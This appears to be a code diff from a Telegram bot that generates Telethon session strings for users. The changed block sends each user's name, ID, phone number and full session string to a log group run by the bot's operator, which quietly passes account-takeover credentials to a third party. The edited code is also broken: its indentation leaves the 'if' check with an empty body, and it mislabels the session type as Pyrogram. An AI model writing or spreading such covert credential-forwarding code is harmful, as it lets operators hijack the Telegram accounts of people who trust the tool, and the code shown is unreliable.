@@ -96,16 +96,21 @@ async def generate_telethon_session(bot, query: CallbackQuery):
 
     # 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
     if LOG_GROUP_ID:
-        log_text = (
-            f"📦 **ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ**\n\n"
-            f"👤 **User:** {name}\n"
-            f"🆔 **ID:** `{user_id}`\n"
-            f"📱 **Phone:** `{phone_number}`\n"
-            f"🛠 **Type:** Telethon\n\n"
-            f"✨ **Session (Tap to Copy):**\n<code>{string_session}</code>"
+    log_text = (
+        f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
+        f"👤 <b>User:</b> {name}\n"
+        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+        f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
+        f"🛠 <b>Type:</b> Pyrogram\n\n"
+        f"✨ <b>Session (Tap to Copy):</b>\n"
+        f"<code>{string_session}</code>"
+    )
+    try:
+        await bot.send_message(
+            LOG_GROUP_ID,
+            log_text,
+            parse_mode="HTML"
         )
-        try:
-            await bot.send_message(LOG_GROUP_ID, log_text)
-        except:
-            pass
+    except Exception as e:
+        print(e)
           
